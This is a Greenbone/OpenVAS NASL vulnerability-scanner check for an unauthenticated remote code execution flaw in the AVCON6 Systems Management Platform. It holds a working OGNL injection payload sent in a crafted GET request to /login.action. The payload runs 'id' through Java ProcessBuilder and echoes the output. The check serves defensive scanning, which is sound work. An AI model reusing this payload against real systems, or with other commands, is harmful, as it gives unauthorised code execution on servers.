# Copyright (C) 2019 Greenbone Networks GmbH
# Text descriptions are largely excerpted from the referenced
# advisory, and are Copyright (C) of the respective author(s)
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:epross:avcon6_system_management_platform";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.142919");
  script_version("2019-09-23T08:05:16+0000");
  script_tag(name:"last_modification", value:"2019-09-23 08:05:16 +0000 (Mon, 23 Sep 2019)");
  script_tag(name:"creation_date", value:"2019-09-23 07:28:52 +0000 (Mon, 23 Sep 2019)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"NoneAvailable");

  script_name("AVCON6 Systems Management Platform RCE Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2019 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_avcon_systems_management_platform_detect.nasl");
  script_mandatory_keys("avcon_smp/detected");

  script_tag(name:"summary", value:"AVCON6 Systems Management Platform is prone to a remote code execution
  vulnerability.");

  script_tag(name:"impact", value:"An unauthenticated attacker may execute arbitrary code on the system.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"solution", value:"No known solution is available as of 23rd September, 2019.
  Information regarding this issue will be updated once solution details are available.");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/47379");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (! get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

url = "/login.action?redirect:" +
      "${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{%22id%22}))." +
      "start(),%23b%3d%23a.getInputStream()," +
      "%23c%3dnew%20java.io.InputStreamReader(%23b)," +
      "%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d" +
      ".read(%23e),%23matt%3d%23context." +
      "get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27)," +
      "%23matt.getWriter().println(%23e),%23matt." +
      "getWriter().flush(),%23matt.getWriter()" +
      ".close()}";

req = http_get(port: port, item: url);
res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

if (res =~ "uid=[0-9]+.*gid=[0-9]+.*") {
  report = 'It was possible to execute the "id" command.\n\nResult:\n\n' + chomp(res);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
